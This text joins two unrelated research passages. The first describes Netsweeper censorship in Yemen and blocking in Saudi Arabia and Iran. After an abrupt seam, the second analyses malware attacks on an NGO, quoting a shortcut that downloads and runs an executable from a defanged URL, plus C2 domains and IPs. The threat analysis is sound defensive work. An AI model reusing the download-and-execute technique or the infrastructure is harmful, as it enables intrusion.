‘http://127.0.0.1/webadmin/deny/index.php?dpid=2’ would serve another. The blockpage we identified on YemenNet uses the value ‘dpid=5’ which presents the customized block message in Arabic shown in Figure 16. Of all the Netsweeper devices identified, only 82.114.160.94 has a custom blockpage with Arabic text. The other Netsweeper servers found on this network have only the default Netsweeper blockpages. Another factor that suggests that this server’s only function is to serve the blockpage is that this is the only server we identify that has HTTPS disabled and serves the blockpage entirely unencrypted over port 80. Port 443 is open on this IP but serves no content, and it is the only Netsweeper server identified here configured as such. In our testing data, we only saw this one IP serve the blockpage and it was always served unencrypted over port 80. YemenNet administrators may have disabled SSL encryption for the blockpage in an effort to reduce the bandwidth needed to serve blockpages to its customers.\nA policy server, as described by Netsweeper’s documentation, “categorizes the (user’s) request, maps the requests to a policy, and determines whether the request should be allowed or blocked.” We are able to identify the use of six different policy servers, as the blockpage URL annotates which server made the decision in each of the blockpages it serves. For example, a sample blockpage found in our tests on YemenNet looked as follows (emphasis added):\n\nOur test results identify six different policy servers, ranging from NS-PS01 to NS-PS06. We see these hostnames in our SHODAN results on YemenNet, all of which run Netsweeper, sequentially in the IP range from 82.114.160.96 (NS-PS01) to 82.114.160.101 (NS-PS06). Given that they are annotated in each blockpage (as nsphostname) and that the name is NS-PS01 we can infer these are the Netsweeper policy servers and that there are six active servers in this infrastructure.\nOur test results show which policy servers were used most often for processing blocking decisions, as shown in Figure 26:\nFigure 26: Proportion of blocking performed per YemenNet Netsweeper host\nThe final component we see are three sequential IPs (82.114.160.102 to 82.114.160.104); two with the hostnames of ‘webadmin01’, and one with a hostname of ‘webadmin02’. The names suggest that these are functioning as the webadmin component of Netsweeper. According to Netsweeper documentation, webadmin is a “web-based administration module that is used to manage all aspects of the Netsweeper platform including: creating policies, managing users, generating reports, updating system access rights, monitoring system usage, etc.” This is the part of the system that administrators would interact with in order to change what is filtered as well as to generate reports about which users are accessing blocked content.\nIn totality, these three components and 10 servers encompass the blocking infrastructure present in YemenNet.\nAre Netsweeper devices in Yemen communicating with Netsweeper-controlled servers in North America?\nAs has already been described, Netsweeper’s filtering process assigns all URLs to a category based on content, and allows system administrators to either permit or deny users from accessing URLs in that category. Given the enormous volume of potential URLs which may be accessed and thus need to be categorized, part of Netsweeper’s service offerings include linking a customer’s installation to the company’s master database of categorized URLs.\nThe process works as follows: If a user in Yemen accesses a URL which is not in the database (and thus has not been categorized) by the Yemeni Netsweeper installation, the system in Yemen will communicate with Netsweeper’s Master Category Name Server, which “is hosted on the Internet by Netsweeper.” This Netsweeper hosted server accesses the URL, performs an automated analysis of the site’s content in order to categorize it, and returns that categorization to the local Netsweeper installation. The company’s documentation says that the “entire Netsweeper categorization process—from initial outgoing Internet request for a URL never seen by the system before (worldwide) to Categorization Engine categorization and storage in the database—takes as little as one second and at most about five seconds.”\nWe sought to determine if YemenNet’s Netsweeper installation was actively communicating with and receiving service from Netsweeper. We attempted to confirm this by creating new, uncategorized websites, accessing them from YemenNet and examining requests for those websites. We registered 6 domains which hosted innocuous content on servers we controlled. A user of YemenNet located in Yemen then accessed 3 of these domains, while the remaining 3 acted as a control and were only accessed outside of Yemen. We then observed the server logs to identify what content was requested and where the requests came from.\nIn all 3 non-control cases, the server logs show the YemenNet user accessing the test domain, followed less than a second later by another request for the same content, as shown below in Figure 27:\nFigure 27: Server log files showing request for test domain from Yemen followed less than 1 second later by a request from a Rackspace-hosted IP address. (Note: Identifying information has been redacted from this image)\nAll three requests, corresponding to the 3 test domains, came from IP addresses hosted by Rackspace, a large US-based cloud service and hosting company. None of the 3 control domains were visited by Rackspace IP addresses. While the Rackspace IP addresses differed, the requests, including user-agent string and all requesting headers, were identical. Additional attempts to access the 3 test domains from Yemen the following day were not followed by requests from Rackspace-hosted IP addresses.. This was expected behaviour, as the Netsweeper installation in Yemen would already have the category for this URL and would not need to fetch it again. In addition, attempts to access these websites from an ISP which does not use Netsweeper were not followed by requests from Rackspace-hosted IP addresses.\nThis precise set of actions — an uncategorized website is accessed by a Rackspace IP address request within a second it being accessed on an ISP using Netsweeper — was described by a user of the Australian ISP Telstra, which were later acknowledged by Telstra as the process by which their Netsweeper installation categorizes previously unseen URLs.\nWhile we cannot definitively link these requests from Rackspace-hosted IP addresses to YemenNet’s Netsweeper installation, the behaviour we identified was consistent with previous reports of Netsweeper installations categorizing unseen URLs. These tests show it is highly likely that Netsweeper infrastructure is communicating with and providing services to the YemenNet Netsweeper installation.\nOverview of content blocked in Yemen\nWe turn now from analysis of the blocking system to the type of content targeted for blocking in Yemen. Content found blocked on YemenNet included local news websites providing news and views on the armed conflict in the country. These sites cover news about the ongoing armed conflict between the Houthi rebels and their allies on one side, and supporters of President Hadi (known as the Popular Resistance Committees) aided by Saudi-led airstrikes on the other. The websites highlight the atrocities of the war and civilian casualties caused by both sides. Blocked sites address, inter alia, how the war has exacerbated the humanitarian crisis through deterioration of health services, due to the electricity cuts and shortage of fuel needed to operate hospitals and health centers; citizens’ inability to travel due to the lack of fuel for vehicles; and the impact of the war on the local economy and employment.\nThough such coverage is available on websites that remain accessible, the blocked websites appear to have been blocked because they publish reports and op-eds that are particularly explicit in criticising the Houthi rebels, accusing them of triggering the war by taking over the capital and expanding to other provinces by force. Generally speaking, the reports and op-eds on the blocked websites seem to be supportive of the government of President Hadi, which is recognized regionally and internationally as the legitimate government of Yemen, and they do not recognize the constitutional declaration announced by the Houthis to formally take control of the government. For example, one of the blocked websites features on its home page photos of lead politicians who have been arrested by the Houthis and another one has published (in Arabic) a report about civil society organizations documenting alleged human rights violations and atrocities committed by the Houthis. Another blocked website published an opinion piece (in Arabic) in which the writer calls for dissolving the political party GPC, which is headed by the Houthis’ ally former president Saleh, for collaborating with the Houthi militias. Another website has reported on the number of Houthi casualties in the armed conflict. Finally, a blocked news portal aggregates stories from many of the other blocked local media websites.\nThe vast majority of the blocked websites are local news portals and websites of local newspapers and media outlets as well as websites of local political parties. Websites of two pan-Arab news websites appear among the blocked list: the website of Aljazeera TV station and the website of Al-Arabiya TV station.\nWith the exception of URLs belonging to the Israel TLD (described below), most filtering of news and political content is non-transparent. The ‘404 Not Found’ page returned appears to be an attempt to mislead users into thinking particular websites are inaccessible for technical reasons rather than intentionally blocked.\nURLs from three other categories not specific to Yemen (Pornography, Nudity, and Web Proxy) were also found blocked, all via the Netsweeper blockpage. Among those URLs were two diagnostic websites used for troubleshooting a Netsweeper installation:\nhttp://denypagetests.netsweeper.com/category/catno/32\nhttp://denypagetests.netsweeper.com/category/catno/23\nThese two URLs are both created by Netsweeper and have been categorized by the company as the content categories Web Proxy (32) and Pornography (23), respectively. They are meant to be used by systems administrators to determine if the correct content categories are being blocked on their installations. The fact that these URLs are blocked is further confirmation that Netsweeper is being used by YemenNet. The ‘deny page test’ URL for the category ‘Nudity’ (3) is also likely blocked, however, it was not on the testing list at the time of testing.\nFiltering of all Israel top level domain URLs\nOne of the key findings of these tests is that all Israel top-level domain (.il) URLs tested (with one special exception) were found to be blocked (listed below). The testing list contained 25 URLs belonging to this TLD, which represented a range of different content types, from the website of the Mossad to the Israel Basketball League. All but one of these URLs are found to be blocked using the Netsweeper blockpage. The sole exception is the URL ‘http://thissitedoesnotexist.il’, which is not a registered domain. We hypothesize that as the DNS lookup did not complete successfully, the request did not reach the Netsweeper device.\nPrevious ONI test results from Yemen have not shown any evidence that .il websites were blocked. The Houthis, who control YemenNet, use the slogan “Death to America, Death to Israel, A curse upon the Jews! Victory for Islam!” and they have displayed the slogan in areas under their control. They have also printed the slogan on walls of institutions they run such as YemenNet as shown in Figure 28 below. Interestingly, Iran is another country that blocks all URLs using the Israel ccTLD. This raises the question whether the Houthis, who control the ISPs in Yemen undertaking the blocking and share the Shiite ideology with and receive military support from Iran, are aligning their censorship policy with the censors in Iran.\nFigure 28: YemenNet’s front gate. The Houthis’ slogan is visible to the left and right of the gate, printed on the wall in green and red. The slogan says “Allah Akbar; Death to America, Death to Israel, A curse upon the Jews! Victory for Islam!” (Photo credit: Naser Noor)\nThe blocking of all .il URLs is an intriguing development that implies objection to the state of Israel, with which Yemen does not have diplomatic relations. The previous government of Yemen, during the regime of ex-president Saleh, did not block .il websites despite the fact that there has never been diplomatic relations between the two states. Other Arab states that do not have formal diplomatic relations with Israel (e.g., Saudi Arabia) do not block all .il websites. Interestingly, YemenNet renders its standard explicit blockpage for .il websites, which suggests that the censors are open about this particular policy. See Figure 29 for an example.\nFigure 29: Screen shot showing blocking of an Israel top level country domain name with Netsweeper blockpage.\n \nThe following URLs belonging to the Israel TLD were blocked using a Netsweeper blockpage:\n \n\nhttp://elyon1.court.gov.il/eng/siyur/index.html\nhttp://library.sheba.co.il\nhttp://minuf.co.il\nhttp://neswangy.net\nhttp://rhr.org.il/eng/\nhttp://www.aaci.org.il\nhttp://www.ahewar.org\nhttp://www.antiquities.org.il\nhttp://www.basket.co.il\nhttp://www.boi.org.il\nhttp://www.bus.co.il\nhttp://www.cbs.gov.il\nhttp://www.greenbo.co.il\nhttp://www.mod.gov.il\nhttp://www.mossad.gov.il/default.aspx\nhttp://www.nbn.org.il\nhttp://www.rafael.co.il\nhttp://www.ramla.muni.il\nhttp://www.science.co.il\nhttp://www.sqlserver.co.il\nhttp://www.tase.co.il/eng/pages/homepage.aspx\n\nOther content categories blocked in Yemen:\nTest results reveal that YemenNet continues to block websites from various categories as has been previously documented by ONI. Examples include content that is critical of Islam (e.g., http://answering-islam.org), sex and pornography websites (e.g., playboy.com) and privacy and anonymization tools websites (e.g., http://anonym.to).\nCorporate social responsibility implications of Netsweeper services to YemenNet\nAs Citizen Lab has explored in a number of reports, Internet filtering technology is inherently “dual use” — that is, it may serve legitimate and socially beneficial purposes such as traffic management, but may also be put to more nefarious ends, including the curtailing of information and services that would enable citizens to hold regimes accountable and effectively communicate. Private sector entities that supply such technology are in a difficult position, as they must consider the potential human rights impact of their services without themselves acting as unaccountable arbiters of what content is appropriate or properly circumscribed under relevant law. A number of companies have publicly struggled with these issues, for example, Websense, which developed an anti-censorship policy.\nDespite the complexity of these problems, companies have the responsibility at all times to respect human rights. The UN Guiding Principles on Business and Human Rights note as a basic foundational principle, “Business enterprises should respect human rights. This means that they should avoid infringing on the human rights of others and should address adverse human rights impacts with which they are involved.” Furthermore, companies should “[s]eek to prevent or mitigate adverse human rights impacts that are directly linked to their operations, products or services by their business relationships, even if they have not contributed to those impacts” – which requires proactive efforts with respect to clients utilizing their services.\nIn the case of Netsweeper’s provision of services to YemenNet, it is clear that under the control of the Houthis the ISP has used Netsweeper technology in a manner that adversely impacts human rights. Through its Netsweeper installation, YemenNet has censored news and opinion related to the conflict, undermining users’ rights under Article 19 of the International Covenant on Civil and Political Rights (ICCPR) to hold opinions without interference and “to seek, receive and impart information and ideas of all kinds.” Moreover, Netsweeper technology is employed to filter any content originating from an Israeli top-level domain (.il), in blatant violation of international human rights law. The UN Human Rights Committee has noted in its General Comment No. 34, regarding application of ICCPR Article 19, that:\n“Any restrictions on the operation of websites, blogs or any other internet-based, electronic or other such information dissemination system, including systems to support such communication, such as internet service providers or search engines, are only permissible to the extent that they are compatible with paragraph 3 [of ICCPR Article 19, which provides that restrictions on the right to freedom of opinion and expression may be permissible if they are provided by law and are necessary for respect of the rights or reputations of others, or for the protection of national security or of public order, or of public health or morals]. Permissible restrictions generally should be content-specific; generic bans on the operation of certain sites and systems are not compatible with paragraph 3. It is also inconsistent with paragraph 3 to prohibit a site or an information dissemination system from publishing material solely on the basis that it may be critical of the government or the political social system espoused by the government.”\nAccording to the Committee’s reasoning, a generic ban of an entire swath of content on the basis of its ccTLD, regardless of its actual content, is never permissible under the ICCPR. It is therefore incumbent upon Netsweeper to prevent such use of its technology in order to fulfill its corporate responsibility to respect human rights.\nCitizen Lab sent a letter to Netsweeper on October 9, 2015 inquiring about the use of its products by YemenNet; the letter is reproduced here. Our letter raises questions regarding Netsweeper’s due diligence to maintain knowledge of the end user and end uses of its technology in Yemen, an active conflict zone; its lack of policy statement and continued silence on the human rights impacts of its products and services; and its ability to design or control its technology in a manner that prevents certain human rights abuses. As of October 20, 2015, we have not received a reply to this letter.\nb. Saudi Arabia\nIn April 2015, Yemeni media reports suggested that Saudi Arabia had blocked Yemeni government and news websites controlled by the Houthis or affiliated with ousted president Saleh. We conducted tests of a list of relevant websites (a full testing list can be found in the data section below) to confirm this new blocking.\nWe performed testing using the ICLab platform on VPNs based in Saudi Arabia. Testing was conducted on a commercial VPS provider which gets Internet connectivity from Saudi Telecom Company. Testing was conducted using two testing lists: first, a list of 401 URLs containing sites related to Saudi Arabia’s domestic political, religious and cultural context, as well as a sampling of Yemen-related news websites and sites belonging to the Israel .IL ccTLD; second, the Alexa Top 500 URLs worldwide. In total, 901 URLs were tested in Saudi Arabia.\nOur test results confirmed user reports of Yemen-related content, amongst other types of content, being blocked in Saudi Arabia. Our testing identified two distinct blockpages, as shown in Figure 30 and Figure 31:\nFigure 30: “Blue” blockpage displayed in Saudi Arabia when accessing blocked content\nFigure 31: “Green” blockpage displayed in Saudi Arabia when accessing blocked content\nBoth blockpages indicate that they are being generated by Wirefilter, a filtering product developed by Saudi-based company Sewar Technologies. The headers returned with the blockpage contain additional information which, in a similar manner to the Netsweeper hostnames described above, further identify the different devices which make up the Wirefilter infrastructure. For example, the one header returned with the blockpage says: “Protected by WireFilter 8000 (RY-WF01-FB03)” in the server tag. It is likely that the 10 digit code (“RY-WF01-FB03”) identifies the specific device used to perform filtering or return the blockpage. In total, we identified 7 unique header responses:\n\nWireFilter\nWireFilter 8000 (RY-WF02-FB01)\nWireFilter 8000 (RY-WF01-FB02)\nWireFilter 8000 (RY-WF01-FB03)\nWireFilter 8000 (RY-WF02-FB03)\nWireFilter 8000 (RY-WF01-FB01)\nWireFilter 8000 (RY-WF02-FB02)\n\nThere was variation in the types of content which led to the green blockpage and those which triggered the blue blockpage. In total, 10 unique URLs triggered the blue blockpage and 103 URLs triggered the green blockpage. The full list of blocked URLs can be found below in the Data section.\nOverview of blocked content in Saudi Arabia\nThe blocked websites which triggered the blue blockpage were websites which disseminate the Houthi narrative on the military and political conflict in Yemen and provide hostile views towards the Saudi government, particularly since the Saudi-led airstrikes began. These websites included the Yemeni government news agency Saba News (http://sabanews.net) which is controlled by the Houthis; the websites of Al-Thawra, a Yemeni government newspaper (http://www.althawranews.net) also controlled byt the Houthis; the website of the former ruling party General People’s Congress (GPC), which is led by Saleh (http://almotamar.net/news/); the website of TV channel Yemen Today (http://www.yementodaytv.net), which is ownd by Saleh; and the news portal Khabar Agency (http://khabaragency.net) which is affiliated with the GPC. The list of URLs blocked with the blue blockpage was not exclusively political in nature — file-sharing site The Pirate Bay was also blocked with this blockpage.\nMore websites were blocked after our first test runs. They include the website of the government newspaper 26 September (http://www.26sep.net), which is under the control of the Houthis, the website of Houthi TV station Al-Masirah (http://www.almasirah.tv/), which live streams its broadcast, and Ansar Allah (http://ansar-allah.net), which dissiminates news and views of the Houthi rebels. Also blocked is the news website Saadah Press (http://www.saadahpress.net) and Masa Press (http://masapress.net/), both of which have content aligned with the Houthis and GPC.\nInterestingly, we found a number of Iranian news websites to be blocked. These include the websites of Al-Alam News Network (http://www.alalam.ir), which is Iran’s state news TV station; Iran Republic News Agency (http://www.irna.ir/en) and Fars News (http://arabic.farsnews.com). Iranian media report news sympathetic to the Houthis. As mentioned above, Saudi Arabia has accused Iran of supporting the Houthis militarily.\nOther websites found blocked in Saudi Arabia include content categories which we previously found to be blocked as part of our research on ONI. They include pornography, LGBT content, circumvention tools, file-sharing sites, as well as critical religious and political content.\nThe blocked websites which triggered the green blockpage included a broader variety of content categories, including pornography, LGBT content, circumvention tools, file-sharing sites, as well as critical religious and political content not related to Yemen.\nc. Iran\nAs a result of the reports linking Iran to the conflict in Yemen, we conducted additional network measurement testing in Iran to identify instances of filtering relevant to the conflict. We tested on a publicly available VPN, using a testing list containing Saudi news websites, a sampling of .IL URLs, as well as the Alexa Top 500 websites.\nWe performed testing using the ICLab platform on a VPN based on the ISP Soroush Rasaneh, as well as some follow-up testing on a commercial VPS provider in Iran. The full list of URLs tested can be found in the Data section below. In total, 655 URLs were tested on this ISP in Iran.\nOur test results confirmed instances of blocking on this ISP in Iran.Test results identified 211 URLs which returned the blockpage shown in Figure 32:\nFigure 32: Blockpage identified in Iran\nThis blockpage had the following source:\n\nOverview of content blocked in Iran\nOur test results confirmed instances of Saudi Arabia-related blocking in Iran, as well as blocking of content related to Israel. Among the blocked content is the website of Saudi-owned pan-Arab TV station Al-Arabiya (http://alarabiya.net), which we found to have been blocked in Yemen after the Houthis have taken over government institutions. Also blocked are Saudi newspapers Al-Riyadh (http://www.alriyadh.com/) and Al-Yaum (http://www.alyaum.com), Saudi-owned pan-Arab newspaper Asharq Al-Awsat (http://aawsat.com), and Saudi newsportal Sabq (http://sabq.org).\nWe also found that a major Yemeni news website, Mareb Press (http://marebpress.net/) is blocked in Iran. Interestingly, this website is among those blocked in Yemen by YemenNet, which is under the control of Houthis. Also, we found all Israel top level domain names (.il) blocked in Iran including websites that do not have political or social content, such as a bus service information website (http://www.bus.co.il). Thus Iranian content filtering practices towards Israeli domains are identical to those implemented by YemenNet under control of the Houthis.\nWe also found that Iran continues to block various content in different categories as has been previously documented by ONI.\nDiscussion and Conclusion\nControl of information has always been an important ingredient of armed conflict, but has taken on special importance in the digital age. Parties to an armed conflict now fight over information as much as they do other material resources, and attempt to control the means of communication in their favour just as they attempt to gain air superiority or control over critical sea lanes. However, research on information controls during an armed conflict presents special challenges. Just as the “fog of war” makes it difficult for commanders to make informed decisions based on situational awareness, so does it make it difficult for researchers to trace the dynamics of the information environment through careful evidence-based analysis. In the midst of a war it is difficult to distinguish deliberate attempts to control information through disruption or control of the supply of resources needed to power media or telecommunications from accidents of warfare or collateral damage. Adding to the challenges are the security risks that research in zones of conflict presents. Throughout this case study we faced ongoing concerns about the safety of the in-country researcher with whom we collaborated, debated the ethics of undertaking network measurement in an environment of high risk, and ceased testing altogether as a result of these concerns.\nIn this case study, we find that the Houthis undertook a concerted effort to shape the information environment in Yemen to their advantage by shutting down local media, increasing Internet filtering, and limiting the supply of oil necessary to power infrastructure — what might be best described as a strategy of “information denial” in line with the Houthis’ extreme ideology. Coincidentally, collateral disruptions to electricity and other infrastructure related to the armed conflict have also worked in favour of the Houthis in this regard. Because of disruptions to infrastructure and scarcities of fuel supplies, citizens’ access to information was reduced largely to battery-operated radios, leaving mass media controlled by the very same group that implements strict information the primary source of news and information. Network traffic monitoring data sources, such as those from Google and Dyn, help illuminate the timelines related to outages and, when used alongside corroborating information, can provide further precision to the analysis around attribution in future cases.\nOur positive identification of the use of Netsweeper services in Yemen raises some serious concerns given that those services are being used to implement Internet filtering at the national level by a telecommunications ministry and an ISP controlled by the Houthis, the key leaders and allies of which have been sanctioned by the UN Security Council as a result of their activities exacerbating the conflict. The ongoing provision of services by Netsweeper to YemenNet, to control the flow of information amidst an armed conflict and under the direction of a group that has committed serious human rights violations against journalists and the media, warrants special scrutiny from a corporate social responsibility perspective. Netsweeper technology is being used to shape the information environment in the interests of one side of the armed conflict and is therefore implicated in a war-related information control machine that prevents citizens’ right to know and media’s right to inform.\nWe also find that the armed conflict in Yemen has international implications, as countries party to the conflict have implemented Internet censorship in their own jurisdictions, thus affecting their citizens’ abilities to exercise their right to access information and communicate freely. Our network measurement tests show that Saudi Arabia has expanded its internet censorship practices to include content emanating from Houthi-owned and Houthi-controlled media and that which is critical of the Saudi-led military campaign, while Internet filtering in Iran blocks select Saudi and Yemeni media content, which bears similarities to that which we find in Yemen — significant because the government of Iran is a principal supporter of the Houthis.\nLastly, the Yemen case study demonstrates how armed conflict can affect the information environment in surprising ways, but not in a vacuum. While the Houthis introduced radical measures that dramatically shifted access to information and means of communication, they did so on top of an existing technological infrastructure that included advanced content filtering systems provided by a company already contracted to the principal national ISP. Some reports, which we could not independently confirm, suggested they also inherited and are deploying advanced surveillance equipment. The Yemen case therefore underscores that “dual-use” technologies can be put to nefarious ends when circumstances change; and in situations of warfare, change can be extreme.\nAcknowledgements\nThe Citizen Lab would like to thank Doug Madory from Dyn for producing traffic and AS maps, Collin Anderson for collecting network measurement data, Masashi Crete-Nishihata and John Scott Railton for comments, and Irene Poetranto for layout.

    "text": "\n\t\t\t\tBy: Katie Kleemola, Masashi Crete-Nishihata, Adam Senft, and Irene Poetranto\nSummary\n\nThis report analyzes a campaign of targeted attacks against an NGO working on environmental issues in Southeast Asia.\n\n\nThe email messages used in the attacks leverage themes related to economic development and politics in Burma, which is relevant to the work of the NGO.\n\n\nOur analysis reveals connections between these attacks, recent strategic web compromises against Burmese government websites, and previous campaigns targeting groups in the Tibetan community.\n\nBackground\nFor many years, Burma was known as one of the world’s most heavily restricted information environments. Internet censorship was pervasive, connectivity was prohibitively expensive, and media publication laws created a climate of self-censorship. Recently, however, the country has been undergoing a process of political and economic transformation. Online censorship has decreased, the introduction of two large foreign telecom providers has sparked competition and reduced barriers to access, and the draconian 1962 Printers and Publishers Registration Law has been replaced.\nOn November 8, 2015, Burma will hold a general election, the first since a nominally civilian government took power in 2011. The participation of opposition leader Aung San Suu Kyi’s National League for Democracy party, the religious strife and ongoing armed conflict with ethnic armies and rebel groups, as well as the disruptive effects of increased foreign investment have set the stage for a highly contentious election.\nBurma is a resource-rich country, known for its oil, gas, minerals (e.g., zinc, copper, tin, tungsten), jade and other gemstones, and forest products (e.g., timber). Burma also has large hydro power potential, with 302 projects currently ongoing to deliver electricity to the entire population. The process of liberalization has cast a spotlight onto these resources, which many have been eyeing for commercial exploitation, especially neighbouring countries like China and India, and yet they are situated in the midst of armed conflict. China’s demand for natural resources has led it to invest heavily in Burma, providing backing for infrastructure projects such as pipelines, dams, highways, and railways. This undertaking is not without controversy, as these development projects cut across territories known for being political hotspots and have resulted in concerns regarding their significant environmental and human rights impact.\nThe Kyaukpyu Shwe Gas Pipeline, for instance, transports crude and natural gas overland from the Bay of Bengal, traversing the conflict-ridden Arakan and northern Shan States, and finally to the city of Kunming, the capital of China’s Yunnan province which borders Burma. The project has been criticized for draining the country of natural resources, damaging the environment, and producing minimal benefit to the local community. The Shwe Gas project has enabled the establishment of related projects, such as the creation of a Kyaukpyu Special Economic Zone (SEZ) and a 950-kilometre railway, running parallel to the pipeline, that will link Kyaukpyu township with Yunnan province. Kyaukpyu, situated in Arakan State, has been mired by ethnic unrest, with minority Muslim Rohingyas being targeted by non-Muslims. Pictures from the township obtained by Human Rights Watch following a week that violence broke out in 2012 showed that more than 811 buildings and houseboats had been razed. Clashes have also continued to occur between Burma’s army and rebel groups fighting in the predominantly ethnic Chinese area of Kokang in northern Shan State.\nAs Burma’s economy further develops, with China as one of its main trading partners, the number of China-backed projects in the country is likely to increase. Simultaneously, political reforms and better access to information and communication technologies have facilitated citizens’ expression of discontent. Civil society organizations are also working towards improving transparency and accountability in resource management, as the government and ethnic rebel groups strive to establish a nationwide ceasefire agreement. The ongoing interaction of these factors will carry wide-ranging implications for Burma’s transition to democracy.\nPre-Reform Targeted Attacks\nBurmese civil society and media organizations have faced targeted online attacks both before and after the current liberalization process. During the last years of the military junta (1962-2011), Burmese independent media groups experienced waves of distributed denial-of-service (DDoS) and defacement attacks, often around the anniversary of the 2007 “Saffron Revolution,” a period of mass protests during which authorities shut down national access to the Internet. While activists generally suspected the military junta of being behind the DDoS and defacements, attribution around these attacks is inconclusive.\nReports of targeted malware attacks during this period are less frequent. In 2000, Burmese political activists reported receiving malware attacks, and accused the government of engaging in an organized attack campaign.\nPost-Reform Targeted Attacks\nSince the beginning of the reform period, a number of reports have emerged of targeted malware attacks against journalists and Burmese government targets that are contextually related to the energy sector and industrial development issues in the country.\nBeginning in 2013, a number of domestic and foreign journalists working in the country received warnings from Google that their Gmail accounts might have been targeted by “state-sponsored attackers”. Government spokespeople denied that the Burmese government had engaged in these activities. Similar Gmail warnings were reported in 2014, and appeared to indicate attacks on journalists covering news about the Kyaukpyu Shwe Gas Pipeline.\nIn May 2015, Palo Alto Networks reported that the website of the President of Myanmar was compromised by attackers who injected an Inline Frame (IFRAME) into a JavaScript file in the site’s Drupal theme. This IFRAME served visitors a variant of the Evilgrab malware family. The Evilgrab malware has typical RAT capabilities including collecting screenshots, recording keystrokes, and capturing video and audio from the webcam and microphones of compromised devices. This kind of attack, in which attackers compromise normally trusted websites and serve malicious code to specific visitors, is often referred to as a strategic web compromise.\nPalo Alto Networks identified the compromise after a computer belonging to a “globally recognized organization in the oil and gas industry” visited the URL containing the malicious code. While the report does not attribute the attack to a specific actor, it notes that the choice of the President’s website as a vector suggests that individuals or organizations engaged in political relations with Burma may have been the intended target.\nIn August 2015, Arbor Networks released a report documenting a similar strategic web compromise against a Myanmar Ministry of Information website (http://www.moi.gov[.]mm) hosting content related to the Myanmar Motion Picture Development Department. Similar to the previous attack against the President of Myanmar website, an IFRAME was injected into the site that pointed to a malicious file in the Drupal themes folder. The malware in this attack is from the PlugX malware family, which has similar RAT functionality as EvilGrab.\nThe malware used “Kpsez-htday” as a Command and Control (C2) authentication string, which may be a reference to the Kyaukpyu Special Economic Zone. Arbor Networks also identified common C2 domains used by this malware, and the Evilgrab malware reported by Palo Alto Networks:\nusafbi.websecexp[.]com\nusacia.websecexp[.]com\nwebhttps.websecexp[.]com\nappeur.gnway[.]cc\nArbor Networks further identified PlugX malware hosted on the website of the Union Election Commission (http://www.uecmyanmar[.]org), a national level electoral commission in Burma.\nPlugX uses a technique called DLL sideloading,  in which a legitimate executable runs a malicious DLL. This malicious code then decrypts and decompresses the binary file in memory which contains the main malicious functionality. Since the malicious code is being run by a signed, legitimate executable, and the payload never exists unencrypted on disk, it is more difficult for antivirus programs to detect the malware. The PlugX sample found on the Union Election Commission website used a legitimate executable signed by McAfee.\nThe overlapping C2 servers that link the PlugX attacks to the previous Evilgrab reported by Palo Alto Networks suggest that either the same attack group is responsible for the two attacks, or that multiple groups are using the same infrastructure.\nTargeted Attacks on an Environmental NGO\nThis report analyzes two targeted malware attacks against an NGO working on environmental issues in Southeast Asia. These attacks have technical and contextual links to previously reported attacks on Burmese government websites, and are also linked to attack campaigns against Tibetan groups. We conclude that at least two scenarios are possible: these attacks are being conducted by the same attackers, or  multiple attack groups are sharing infrastructure and development resources.\nAttack 1\nOn June 5, 2015, staff members of the NGO received an email with the subject “Japanese firms apply to operate in SEZs Permit.” This subject line matches the title of an article published by online news organization Eleven Myanmar about Japanese insurance companies activities’ in Burma’s Thilawa Special Economic Zone.\nThe email body contained the following content:\n“Dear all,\nJapanese firms apply to operate in SEZs Permit.\n[Redacted Google Drive link]\nThe NGO was suspicious of the email, as it appeared to be sent from an email address that closely resembled (but did not match), the address of an individual in the organization.\nThe Google Drive link in the body connects to a file ‘Permit.zip’. This zip folder contains Permit.jpg.lnk, a shortcut that opens a command prompt to download and run ca-bundle.exe from the Chinese forum site hjclub.info (hxxp://www.hjclub.info/bbs/uploadfiles/45/ca-bundle.exe’,’%TEMP%\\ca-bundle[.]exe). When executed, ca-bundle.exe drops a self-extracting archive (AwViewWx.exe) that contains the three components of PlugX, a signed legitimate executable, a malicious DLL, and a binary file containing the main payload.\nIn this case the malware uses a McAfee Oem module as its legitimate executable  (MD5: 884d46c01c762ad6ddd2759fd921bf71) with a certificate that expired in 2008. This executable is the same one used in the PlugX sample reported by Arbor Networks.\n\nThe malware connects to the C2 t2.mailsecurityservice[.]com and t1.mailsecurityservice[.]com, which resolve to 118.193.212.98, a server registered to a customer in Shanghai, China, according to WHOIS results. We found an additional malware sample (MD5:15c926d2602f65be0de65fa9c06aa6c6) hosted on the C2 at the address hxxp://client.mailsecurityservice.com/ViewClient/connect.php?n=zxishanchu1106[.]exe. This sample also uses t2.mailsecurityservice[.]com as a C2.\nAttack 2\nOn August 16 2015, the same NGO received an email with the subject “Burma Gags Media Linked to Shwe Mann, Adding to Concerns About Reforms.” This subject line is the title of an article published by Reuters that reports on an effort by Burma’s government to limit public discussion of Shwe Mann, a parliamentary speaker who was purged from the ruling party in August 2015.\nThe email body contained the following content:\nBurma Gags Media Linked to Shwe Mann, Adding to…\n[Redacted Google Drive link]\nThe Google Drive link connects to a zip file “Burma Gags Media Linked to Shwe Mann, Adding to Concerns About Reforms.zip”. The zip archive includes two files: a  benign document “Burma Gags Media Linked to Shwe Mann, Adding to Concerns About Reforms.docx.” and a Windows Screensaver file that contains malware “Burma Gags Media Linked to Shwe Mann, Adding to Concerns About Reforms.scr”. The .scr file includes a Microsoft document icon to trick recipients into thinking it is a document file. The file is actually a self extracting RAR archive that drops three files: a legitimate executable, a malicious DLL, and a binary file with the payload.\nWhile these three components are similar to the structure of PlugX, the malware used in this attack is the 3102 variant of the 9002 malware family. The variant is labeled 3102, because it always uses the string “3102” in its first communications with a C2 server.\nThe legitimate executable is labeled “lsass.exe” presumably to make it appear to look like a Windows system file when it is run. What appears to be a DLL used for error handling XLBugHandler.dll is actually malicious.\nTo bypass certificate warnings, the malware uses a genuine code-signing certificate signed by Shenzhen Thunder Networking Technologies Ltd. on August 3 2015, which relative to other attacks we have observed is an unusually recent signature.\n\nThe malware connects to the C2 198.44.190.85.

